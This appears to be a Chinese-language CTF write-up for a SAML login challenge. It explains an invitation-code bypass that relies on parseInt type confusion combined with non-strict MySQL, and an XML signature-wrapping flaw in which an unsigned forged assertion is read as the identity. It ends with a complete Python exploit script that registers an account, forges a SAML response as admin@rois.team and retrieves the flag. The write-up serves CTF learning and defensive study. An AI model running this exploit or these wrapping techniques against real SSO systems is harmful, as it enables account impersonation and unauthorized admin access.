## 题目概述

- **IDP (Identity Provider)**: 身份提供者，基于Node.js + Express
- **SP (Service Provider)**: 服务提供者，基于Python Flask

目标是获取SP端`/admin`路径下的FLAG，但访问该路径需要满足条件：`session['email'] == 'admin@rois.team'`

但`admin@rois.team`账号已经在IDP系统启动时被创建（`add-admin.js`），我们无法再注册这个邮箱。



## 漏洞分析

### 漏洞一：IDP注册绕过 - SQL非严格模式 + 类型注入

查看`samlController.js`第21-27行和第183-189行的权限检查：

```javascript
if (req.session.userType !== 0) {
    return res.status(403).render('error', {
        title: 'Access Denied',
        message: 'You do not have permission to use SAML services.'
    });
}
```

**关键发现**：只有`type=0`的用户才能使用SAML功能！

这意味着：
- `type=0`: 受邀用户，可以使用SAML服务
- `type=1`: 自注册用户，无法使用SAML服务

因此，我们需要通过某种方式让自己注册的账号获得`type=0`权限。



#### 1.1 邀请码验证逻辑漏洞

在`auth.js`第29行，注册接口对`type`字段的验证：

```javascript
body('type'),  // 仅声明字段存在，没有任何类型验证
```

**问题**：这里只是声明了`type`字段必须存在，但完全没有验证其格式、类型或取值范围。这意味着我们可以提交任意字符串作为`type`的值。



在`authController.js`第49-58行，验证邀请码的逻辑如下：

```javascript
if (parseInt(type) === 0) {
    if (!invitationCode || invitationCode !== config.getInviteCode()) {
        return res.render('register', {
            title: 'User Registration',
            errors: [{ msg: 'Invalid invitation code' }],
            formData: req.body
        });
    }
}
```

**逻辑分析**：
1. 代码使用`parseInt(type)`将`type`转换为整数
2. 只有当转换结果**严格等于0**时，才会检查邀请码
3. 如果`parseInt(type) !== 0`，就会**跳过整个if块**，不需要邀请码

**关键点**：
- `parseInt()`的行为：
  - `parseInt("0")` → `0`（需要邀请码）
  - `parseInt("1")` → `1`（不需要邀请码，但存储为1，无权限）
  - `parseInt("abc")` → `NaN`（不需要邀请码！）
  - `NaN === 0` → `false`



#### 1.2 MySQL非严格模式漏洞

在`migrate.js`，迁移脚本在执行数据库后MySQL严格模式缺少`STRICT_TRANS_TABLES`：

```javascript
// 第71行：执行迁移前
await this.connection.query(`SET GLOBAL sql_mode = ''`);

// 第107行：迁移完成后
await this.connection.query(`SET GLOBAL sql_mode = 'ONLY_FULL_GROUP_BY,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION'`);
```

**分析**：

在严格模式下，MySQL 会对数据进行严格的校验，确保数据的格式、长度和类型符合表定义的要求。如果数据不符合要求，MySQL 会报错并拒绝插入或更新操作。

在MySQL非严格模式下，数据库对类型转换非常宽松。当向`TINYINT`类型字段插入字符串时，MySQL会尝试自动转换：

- 纯数字字符串如`"123"`会转换为`123`
- 数字开头的字符串如`"123abc"`会截断为`123`
- 非数字开头的字符串如`"abc"`会转换为`0`

这为我们的攻击提供了可能。





### 漏洞二：SP端SAML签名验证绕过

#### 2.1 SAML签名机制简介

SAML使用XML数字签名标准来保证消息的完整性和真实性。一个典型的SAML Response结构如下：

```xml
<samlp:Response ID="_response_id">
  <saml:Assertion ID="_assertion_id">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion_id">
          <ds:DigestValue>...</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>...</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**关键概念**：
- `ds:Signature`：签名元素
- `ds:Reference URI="#_assertion_id"`：指向被签名的元素（通过ID属性引用）
- `ds:DigestValue`：被签名元素的摘要值
- `ds:SignatureValue`：签名值

签名验证的基本流程：
1. 从`Reference`元素的`URI`属性提取被签名元素的ID
2. 在XML文档中查找具有该ID的元素
3. 计算该元素的摘要值
4. 比较计算的摘要值与签名中的`DigestValue`
5. 验证签名值



#### 2.2 SP验证代码分析

**validator.py (48-77行) - 主验证逻辑**

```python
def validate(self):
    if self.public_key is None:
        return False
    
    # 查找Response级别的签名
    response_signature = self._find_response_signature()
    if response_signature is not None:
        # 如果Response有签名，验证Response签名
        if not self._verify_signature(response_signature):
            return False
    else:
        # 如果Response没有签名，验证所有Assertion的签名
        assertion_signatures = self._find_assertion_signatures()
        if not assertion_signatures:
            return False
        
        # 验证找到的每个签名
        for sig_node in assertion_signatures:
            if not self._verify_signature(sig_node):
                return False
    
    # 其他验证（时间、受众等）
    # ...
    
    return True
```

**validator.py (103-123行) - 查找Assertion签名**

```python
def _find_assertion_signatures(self):
    try:
        # 查找所有Assertion节点
        assertion_nodes = self.document.xpath(
            '//saml:Assertion',
            namespaces=self.NAMESPACES
        )
        
        if not assertion_nodes:
            return []
        
        signatures = []
        # 遍历每个Assertion
        for assertion in assertion_nodes:
            # 查找该Assertion的签名
            sig_nodes = assertion.xpath(
                './ds:Signature',
                namespaces=self.NAMESPACES
            )
            # 收集找到的签名
            signatures.extend(sig_nodes)
        
        return signatures
    except Exception:
        return []
```

**validator.py (217-260行) - 验证签名引用**

```python
def _verify_reference(self, reference_node, signature_node):
    try:
        # 获取URI属性
        uri = reference_node.get('URI')
        if not uri:
            return False
        
        # 提取引用的ID（去掉#前缀）
        ref_id = uri[1:] if uri.startswith('#') else uri
        
        # 关键：通过ID属性查找被签名的元素
        signed_elements = self.document.xpath(
            f'//*[@ID="{ref_id}"]'
        )
        
        if not signed_elements:
            return False
        
        signed_element = signed_elements[0]
        
        # 验证摘要值
        # ...
```

**parser.py (58-79行) - 提取NameID**

```python
def get_nameid(self):
    if self.document is None:
        return None
        
    # 查找所有Assertion
    assertions = self.document.xpath(
        '//saml:Assertion',
        namespaces=self.NAMESPACES
    )
    
    if not assertions:
        return None
    
    # 取第一个Assertion
    assertion = assertions[0]
    
    # 从该Assertion中提取NameID
    nameid_nodes = assertion.xpath(
        './/saml:NameID',
        namespaces=self.NAMESPACES
    )
    
    if nameid_nodes:
        return nameid_nodes[0].text
    
    return None
```



#### 2.4 漏洞原理

通过代码分析可知，**在提取NameID时，并判断使用这个断言有没有被签名**

**攻击步骤**：

1. 获取合法的SAML Response（包含一个已签名的Assertion）
2. 从原始Assertion复制一份，创建"恶意Assertion"
3. 在恶意Assertion中：
   - **删除`<ds:Signature>`元素**（不需要签名）
   - **删除`ID`属性**（关键！避免被签名验证找到）
   - 修改`<saml:NameID>`为`admin@rois.team`
4. 将恶意Assertion插入到原始Assertion的**前面**

**最终XML结构**：

```xml
<samlp:Response>
  <!-- 恶意Assertion：第一个位置，无ID，无签名 -->
  <saml:Assertion>  <!-- 注意：没有ID属性！ -->
    <saml:Subject>
      <saml:NameID>admin@rois.team</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <!-- 其他属性 -->
    </saml:AttributeStatement>
  </saml:Assertion>
  
  <!-- 原始Assertion：第二个位置，有ID，有签名 -->
  <saml:Assertion ID="_original_assertion_id_abc123">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_original_assertion_id_abc123">
          <ds:DigestValue>xxx</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>yyy</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>hacker@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```



**验证流程详解**：

1. **SP调用`validate()`开始验证**

2. **查找Response签名**（`_find_response_signature()`）
   - 在我们的攻击中，Response本身没有签名
   - 返回`None`

3. **查找Assertion签名**（`_find_assertion_signatures()`）
   - 遍历所有`<saml:Assertion>`元素
   - 恶意Assertion：查找`./ds:Signature` → 没有 → 不添加到列表
   - 原始Assertion：查找`./ds:Signature` → 找到1个 → 添加到列表
   - 返回：`[原始Assertion的签名]`

4. **检查签名列表是否为空**
   - `assertion_signatures` = `[原始签名]`
   - 不为空，继续

5. **验证每个签名**（`_verify_signature()`）
   - 对于原始Assertion的签名：
     - 提取`URI="#_original_assertion_id_abc123"`
     - 使用`xpath('//*[@ID="_original_assertion_id_abc123"]')`查找
     - **找到原始Assertion**（因为它有ID属性）
     - 计算摘要值
     - 比较摘要值 → 匹配
     - 验证签名值 → 有效

6. **验证通过**

7. **提取身份**（`get_nameid()`）
   - 使用`xpath('//saml:Assertion')`查找所有Assertion
   - 返回：`[恶意Assertion, 原始Assertion]`
   - 取第一个：**恶意Assertion**
   - 提取NameID：**`admin@rois.team`**

8. **创建会话**
   - `session['email'] = 'admin@rois.team'`



## 攻击链完整流程图

```
步骤1: 注册type=0用户
↓
步骤2: 登录IDP获取SAML Response
↓
步骤3: 构造恶意SAML Response
```



## EXP

```python
#!/usr/bin/env python3
import base64
import random
import re
import string
import sys
import urllib.request
import urllib.parse
import http.cookiejar


def make_opener():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.addheaders = [("User-Agent", "Mozilla/5.0")]
    return opener

def random_string(length=8):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def register(opener, username, email, password):
    # type="abc": parseInt("abc")=NaN, NaN!==0, 跳过邀请码
    # MySQL非严格: "abc"->0, type=0可使用SAML
    data = urllib.parse.urlencode({
        "type": "abc",
        "invitationCode": "",
        "username": username,
        "email": email,
        "password": password,
        "confirmPassword": password,
        "displayName": username,
        "department": "IT",
    }).encode()
    
    resp = opener.open(f"{IDP_BASE}/register", data=data, timeout=10)
    body = resp.read().decode("utf-8", errors="ignore")
    
    if "alert-error" in body:
        print("[-] Register failed")
        return False
    
    print(f"[+] Registered: {username}")
    return True

def login(opener, username, password):
    data = urllib.parse.urlencode({
        "username": username,
        "password": password,
    }).encode()
    
    resp = opener.open(f"{IDP_BASE}/login", data=data, timeout=10)
    body = resp.read().decode("utf-8", errors="ignore")
    
    if "Invalid username or password" in body:
        print("[-] Login failed")
        return False
    
    print(f"[+] Logged in: {username}")
    return True

def get_saml_response(opener):
    # IDP-initiated SSO
    resp = opener.open(f"{IDP_BASE}/saml/idp/Flag", timeout=10)
    html = resp.read().decode("utf-8", errors="ignore")
    
    if "Access Denied" in html:
        print("[-] No SAML permission (type != 0)")
        return None
    
    m = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', html)
    if not m:
        print("[-] SAMLResponse not found")
        return None
    
    print("[+] Got SAML Response")
    return m.group(1)

def build_evil_saml(orig_b64):
    xml = base64.b64decode(orig_b64).decode("utf-8", errors="ignore")
    
    # 提取原始Assertion
    start = xml.find("<saml:Assertion")
    end = xml.find("</saml:Assertion>", start) + len("</saml:Assertion>")
    assertion = xml[start:end]
    
    # 删除签名
    assertion_no_sig = re.sub(r"<ds:Signature.*?</ds:Signature>", "", assertion, flags=re.S)
    
    # 修改NameID
    assertion_admin = re.sub(
        r"(<saml:NameID[^>]*>)(.*?)(</saml:NameID>)",
        r"\1admin@rois.team\3",
        assertion_no_sig,
        count=1,
        flags=re.S,
    )
    
    # 删除ID属性（关键：避免被签名引用）
    assertion_admin = re.sub(r'\sID="[^"]+"', "", assertion_admin, count=1)
    
    # 插入到原始Assertion前面
    evil_xml = xml[:start] + assertion_admin + xml[start:]
    
    print("[+] Built evil SAML: [Evil(no ID)] + [Original(has ID)]")
    return base64.b64encode(evil_xml.encode("utf-8")).decode("ascii")

def get_flag(saml_b64):
    opener = make_opener()
    data = urllib.parse.urlencode({"SAMLResponse": saml_b64}).encode()
    
    resp = opener.open(f"{SP_BASE}/saml/acs", data=data, timeout=10)
    body = resp.read().decode("utf-8", errors="ignore")
    
    m = re.search(r"(RCTF\{[^}]+\})", body)
    if m:
        print(f"\n[!] FLAG: {m.group(1)}\n")
        return True
    
    print("[-] FLAG not found")
    return False

def main():
    username = "evil_" + random_string()
    email = f"{username}@example.com"
    password = "Passw0rd!"
    
    print(f"[*] User: {username} / {email}")
    
    opener = make_opener()
    
    if not register(opener, username, email, password):
        return 1
    
    # 重新登录确保session从DB读取type=0
    opener = make_opener()
    if not login(opener, username, password):
        return 1
    
    saml = get_saml_response(opener)
    if not saml:
        return 1
    
    evil_saml = build_evil_saml(saml)
    
    if get_flag(evil_saml):
        return 0
    
    return 1

if __name__ == "__main__":
    IDP_BASE = "http://localhost"
    SP_BASE = "http://localhost:26000"

    sys.exit(main())

```

